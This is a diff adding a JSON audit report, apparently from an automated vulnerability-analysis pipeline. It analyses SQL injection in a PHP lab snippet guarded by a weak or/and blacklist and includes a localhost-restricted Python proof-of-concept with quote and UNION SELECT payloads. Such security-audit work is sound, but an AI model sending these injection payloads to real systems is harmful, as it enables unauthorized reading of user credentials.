@@ -1,0 +1,162 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-003",
+  "input_version": "v2",
+  "prompt_version": "final",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "SQLI-003"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "输入来源（line 5、7）、唯一防护（line 13 调用 lines 38-43 的 blacklist）、查询拼接与执行（lines 16-17）、结果与错误输出（lines 22、24、30）都在同一片段内逐行可见。blacklist 只删除 or/and 字面串，单引号、UNION、注释符均未被处理，闭合 line 16 的字符串字面量即可改变 SQL 结构，静态路径完整。剩余缺口为连接实现、字符集与运行版本等部署条件，已列入 missing_context，但不影响该静态候选成立。"
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-003-F1",
+      "vulnerability_type": "SQL注入（GET 参数 id 字符串拼接）",
+      "locations": [
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 5,
+          "line_end": 5,
+          "quote": "if(isset($_GET['id']))"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 7,
+          "line_end": 7,
+          "quote": "$id=$_GET['id'];"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 13,
+          "line_end": 13,
+          "quote": "$id= blacklist($id);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 16,
+          "line_end": 16,
+          "quote": "SELECT * FROM users WHERE id='$id' LIMIT 0,1"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 17,
+          "line_end": 17,
+          "quote": "$result=mysql_query($sql);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 22,
+          "line_end": 22,
+          "quote": "echo 'Your Login name:'. $row['username'];"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 30,
+          "line_end": 30,
+          "quote": "print_r(mysql_error());"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 40,
+          "line_end": 40,
+          "quote": "$id= preg_replace('/or/i',\"\", $id);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 41,
+          "line_end": 41,
+          "quote": "$id= preg_replace('/AND/i',\"\", $id);"
+        }
+      ],
+      "data_flow": [
+        "入口：line 5 的 if(isset($_GET['id'])) 只判断参数存在，line 7 的 $id=$_GET['id']; 原样取得 GET 参数 id，没有类型、长度或白名单校验。",
+        "预处理：lines 9-11 用 fopen/fwrite/fclose 先把原始 $id 写入本地 result.txt 日志，未过滤；该写入不改变注入路径，但会留存原始输入。",
+        "过滤：line 13 调用 blacklist($id)；lines 38-43 仅用 preg_replace('/or/i') 与 preg_replace('/AND/i') 删除 or/and 子串，单引号、-- 注释符、UNION 等字符和关键字原样保留。",
+        "观察点：line 14 的 $hint=$id; 保存过滤后的值，line 44 在页面输出 Hint 行并拼接 $hint，可对比过滤前后文本，确认 blacklist 只删除了 or/and。",
+        "查询构造：line 16 把过滤后的 $id 直接拼进单引号字符串字面量 SELECT * FROM users WHERE id='$id' LIMIT 0,1，没有参数化、占位符或 mysql_real_escape_string。",
+        "执行：line 17 的 mysql_query($sql) 执行拼接后的 SQL，line 18 的 mysql_fetch_array($result) 取首行。",
+        "输出：lines 22、24 分别输出 $row['username'] 与 $row['password']；查询失败时 line 30 的 print_r(mysql_error()) 把 MySQL 错误文本直接回显，可用来观察单引号是否越出字符串字面量。"
+      ],
+      "principle": "blacklist 只删除 or/and 字面串，不构成有效防护：line 16 的 SQL 是字符串拼接，用户控制的 $id 位于单引号字面量内部，输入中的单引号未被转义即可闭合字面量，随后可接 UNION SELECT 或条件表达式，并用 -- 注释掉原有 ' LIMIT 0,1，从而改变查询结构。缺少参数化绑定与标识符/值分离是根因；or/and 过滤只影响部分载荷写法，不影响单引号闭合与 UNION 路径。",
+      "impact": "可读取 users 表任意行（username 与 password 字段），并可通过 UNION 读取同库其他表或数据库元数据，也可用恒真条件绕过按 id 的查询逻辑；line 30 的错误回显使报错注入更易观察。影响范围受连接账号权限限制，且需要能访问该 GET 入口。",
+      "preconditions": [
+        "目标部署可访问到 line 5 的 GET 入口并能传入 id 参数（例如 ?id=1）。",
+        "context/sqli-connect.php 能正常建立连接并选中 security 库，且运行环境仍支持 mysql_* 接口（该接口自 PHP 7.0 起已移除，需要兼容的旧版本 PHP 或替代实现）。",
+        "line 13 之前没有 addslashes、mysqli_real_escape_string、magic_quotes_gpc 或统一参数过滤等上游转义；片段内不存在这类代码，片段外未知。",
+        "UNION 提取需要知道 users 表的列数与列序；POC 默认按 3 列（id、username、password）编写，若不符需按实际表结构调整字面量个数。",
+        "若要把状态升级为确认，必须在授权本地环境实际运行 POC 并保存响应证据；本输出没有运行记录。"
+      ],
+      "counterexamples": [
+        "若在 line 13 之前对 $id 做了 addslashes 或 mysqli_real_escape_string，或运行环境为 magic_quotes_gpc=On 的旧版 PHP 并自动转义引号，则单引号无法闭合字面量，本条路径不成立；片段内没有这类处理。",
+        "若 line 16 改为参数化查询（占位符绑定）或 line 13 之前用 is_numeric/intval 把 $id 强制为整数，注入内容无法进入 SQL 结构；片段内没有这类处理。",
+        "若部署前置 WAF 或反向代理拦截引号与 UNION，只降低可达性，不能证明源码安全，需要带对照的实测区分。",
+        "blacklist 会删除载荷中的 or/and（例如 1' OR '1'='1 会被改成 1' '1'='1 而破坏语法），因此依赖 or/and 的载荷不可用；但这不构成安全反例，不含 or/and 的 UNION 载荷仍然保留。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n'''SQLI-003 local-only SQL injection validation draft.\n\nManual adaptation required: confirm the real request path that reaches the\naudited snippet, the users-table column count and the session/cookie source.\nOnly localhost, 127.0.0.1 or ::1 are accepted; redirects are not followed.\n'''\n\nimport argparse\nimport json\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = ('localhost', '127.0.0.1', '::1')\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        return None\n\n\ndef load_session_headers(path):\n    if not path:\n        return {}\n    with open(path, 'r', encoding='utf-8') as fh:\n        data = json.load(fh)\n    headers = {}\n    for key in ('Cookie', 'Authorization'):\n        if isinstance(data.get(key), str):\n            headers[key] = data[key]\n    return headers\n\n\ndef build_url(base_url, path, param, value):\n    parts = urllib.parse.urlsplit(base_url)\n    if parts.scheme not in ('http', 'https'):\n        raise ValueError('base URL must use http or https')\n    if parts.hostname not in ALLOWED_HOSTS:\n        raise ValueError('only localhost, 127.0.0.1 or ::1 are allowed')\n    query = urllib.parse.urlencode({param: value})\n    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, path, query, ''))\n\n\ndef fetch(url, headers, timeout):\n    request = urllib.request.Request(url, headers=headers, method='GET')\n    opener = urllib.request.build_opener(NoRedirect)\n    try:\n        with opener.open(request, timeout=timeout) as response:\n            return response.status, response.read().decode('utf-8', 'replace')\n    except urllib.error.HTTPError as exc:\n        return exc.code, exc.read().decode('utf-8', 'replace')\n\n\ndef main():\n    parser = argparse.ArgumentParser(description='SQLI-003 local validation draft')\n    parser.add_argument('--base-url', required=True, help='e.g. http://127.0.0.1:8080')\n    parser.add_argument('--path', required=True, help='request path of the audited script')\n    parser.add_argument('--param', default='id', help='GET parameter name taken from the code')\n    parser.add_argument('--normal-value', default='1', help='normal numeric id')\n    parser.add_argument('--probe-value', default=\"1'\", help='single-quote syntax probe')\n    parser.add_argument('--union-value', default=\"9999' UNION SELECT 1,'sqli_marker',3-- -\", help='union probe, adjust column count to the real schema')\n    parser.add_argument('--session-file', default=None, help='local JSON file holding Cookie/Authorization')\n    parser.add_argument('--timeout', type=float, default=10.0)\n    args = parser.parse_args()\n\n    headers = load_session_headers(args.session_file)\n    cases = (\n        ('baseline', args.normal_value),\n        ('quote_probe', args.probe_value),\n        ('union_probe', args.union_value),\n    )\n    for label, value in cases:\n        try:\n            url = build_url(args.base_url, args.path, args.param, value)\n        except ValueError as exc:\n            print('%s: scope error: %s' % (label, exc))\n            return 2\n        try:\n            status, body = fetch(url, headers, args.timeout)\n        except urllib.error.URLError as exc:\n            print('%s: connection error: %s' % (label, exc.reason))\n            continue\n        print('== %s ==' % label)\n        print('http_status: %s' % status)\n        print('login_marker: %s' % ('Your Login name:' in body))\n        print('mysql_error_marker: %s' % ('SQL syntax' in body or 'Warning: mysql' in body))\n        print('body_excerpt:')\n        print(body[:600])\n        print()\n    return 0\n\n\nif __name__ == '__main__':\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+，仅使用标准库 argparse、json、sys、urllib.parse、urllib.request、urllib.error",
+          "不需要第三方库，不需要 requests；无离线依赖"
+        ],
+        "parameters": [
+          "--base-url 靶场基址，例如 http://127.0.0.1:8080（脚本仅允许 localhost、127.0.0.1、::1）",
+          "--path 审计脚本的真实请求路径，需按部署人工确认，不能凭片段猜测",
+          "--param GET 参数名，默认 id，来自 line 7 的 $_GET['id']",
+          "--normal-value 正常数字 id，默认 1",
+          "--probe-value 单引号语法探针，默认 1'",
+          "--union-value UNION 探针，默认 9999' UNION SELECT 1,'sqli_marker',3-- -，列数需按真实 users 表调整",
+          "--session-file 本地 JSON 会话文件（可选，保存 Cookie 或 Authorization 键值，不提交版本库、不在输出中打印）",
+          "--timeout 请求超时秒数，默认 10"
+        ],
+        "steps": [
+          "部署：在授权本地靶场放置该脚本及其 context/sqli-connect.php、db-creds.inc，记录 PHP 与 MySQL/MariaDB 版本、users 表列数与运行配置。",
+          "会话：如入口需要登录，创建本地 JSON 会话文件，内容为 Cookie 或 Authorization 键值；文件放在仓库外，不写入口令，运行时不打印。",
+          "基线：python3 sqli003_poc.py --base-url http://127.0.0.1:8080 --path <真实路径> --param id --normal-value 1 --session-file <本地会话文件>，记录 HTTP 状态与 Your Login name 输出。",
+          "引号探针：同一命令改用 --probe-value 1'（shell 中用双引号或转义包裹），与基线对比是否出现 MySQL 语法错误文本。",
+          "UNION 探针：同一命令改用 --union-value 9999' UNION SELECT 1,'sqli_marker',3-- -；若提示列数不匹配，按真实 users 表列数增减字面量后重试一次。",
+          "回归：复跑基线，确认正常查询输出与数据均未变化；全程不执行写操作、不枚举数据库、不导出数据。"
+        ],
+        "expected_observation": "基线请求返回 Your Login name: 与 Your Password: 行（真实 users 行）；引号探针在 print_r(mysql_error()) 处输出类似 You have an error in your SQL syntax 的 MySQL 错误文本，页面不再出现正常登录名；UNION 探针在列数适配后在 username 位置输出 sqli_marker、password 位置输出 3。页面 Hint 行显示 blacklist 处理后的输入，可用于对照过滤行为。",
+        "success_criteria": "需同时满足：(1) 基线请求返回真实 users 行（Your Login name 后为非空字符串）；(2) 引号探针返回 MySQL 语法错误文本，证明未转义的单引号进入 SQL 结构；(3) UNION 探针返回 username 为 sqli_marker 的注入行，证明查询语义被改变；(4) 复跑基线输出与初始一致，确认测试未改动数据。仅 HTTP 200、仅回显输入标记或脚本退出码 0 均不算成功；本草案未运行，以上均为待观察预期。",
+        "limitations": "未运行，所有现象均为预期而非实测。真实请求路径、会话来源与 users 表列数未知，需人工适配；默认 3 列假设依据片段中 username/password 两个输出字段加 id 推断，可能与实际表结构不一致。POC 不枚举数据库、不导出敏感数据，sqli_marker 仅用于证明查询结构可控。mysql_* 在 PHP 7+ 已移除，需要 PHP 5.x 兼容环境。响应 body_excerpt 会包含返回行内容，属于测试库演示数据，不应公开留存。",
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "context/sqli-connect.php 的连接实现：连接字符集、错误模式、是否额外转义、是否使用 mysql_connect 与 mysql_select_db",
+    "db-creds.inc 与 security 库 users 表的实际结构（列数、列名、字段类型）",
+    "实际部署的 PHP 与 MySQL/MariaDB 版本，以及是否启用 magic_quotes_gpc 等旧配置",
+    "该脚本的真实 URL 路径、认证/会话要求、难度配置与入口是否被其他路由重写",
+    "是否存在前置 WAF、反向代理或统一入口参数过滤（会改变可达性与载荷可用性）",
+    "result.txt 日志目录的权限与写入位置（只影响日志写入，不影响注入判定）"
+  ],
+  "risk_notes": [
+    "line 30 的 print_r(mysql_error()) 直接把数据库错误返回给客户端，泄露 SQL 结构与数据库类型，可辅助报错注入，属于信息泄露风险。",
+    "lines 9-11 把未过滤的 GET 参数写入 result.txt，若日志被其他组件读取或展示，存在日志注入与输入留存的隐患。",
+    "line 44 把过滤后的输入直接拼进 HTML 输出且未做 HTML 转义，存在反射型内容注入隐患，超出本次 SQL 注入范围。",
+    "line 14 的 $hint 在 if 块内赋值、line 44 在块外使用；当未传 id 时 $hint 未定义，仅产生 notice，不影响注入路径。"
+  ],
+  "quality_notes": [
+    "mysql_* 系列函数自 PHP 5.5 起弃用、PHP 7.0 起移除，属过时 API，不能在现行 PHP 直接运行。",
+    "blacklist 式过滤（删除 or/and 字面串）不是安全边界，无法覆盖引号、UNION、注释、堆叠查询等写法。",
+    "代码缺少错误处理与统一的数据访问层，SQL 语句以字符串拼接方式构造，维护性与安全性都差。"
+  ],
+  "limitations": [
+    "结论基于单一代码片段（normalized_samples/SQLI-003.php，共 45 行），行号为该代码块从 1 起始的局部行号。",
+    "context/sqli-connect.php 与 db-creds.inc 未提供，连接字符集、数据库账号权限与错误模式未知，可能影响可利用范围与具体载荷。",
+    "未运行任何 POC，verdict 保持待验证；没有实测证据不升级为确认。",
+    "POC 的 UNION 列数按 3 列假设编写，需按真实 users 表结构调整；真实请求路径与会话要求也需人工补充。",
+    "blacklist 会破坏含 or/and 的载荷，实际可用载荷需在本地按过滤行为验证，不能由本静态分析断言。"
+  ],
+  "runtime_evidence": []
+}
